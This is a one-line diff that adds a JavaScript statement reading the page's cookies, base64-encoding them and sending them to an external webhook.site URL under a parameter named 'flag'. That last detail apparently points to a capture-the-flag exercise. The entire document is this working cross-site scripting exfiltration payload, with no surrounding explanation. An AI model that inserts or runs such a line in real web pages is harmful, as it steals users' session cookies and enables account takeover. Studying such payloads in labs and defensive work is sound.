@@ -1,0 +1,1 @@
+fetch('https://webhook.site/6b7ddc3d-907f-4fd1-80e8-c9f125573de1?flag=' + btoa(document.cookie));
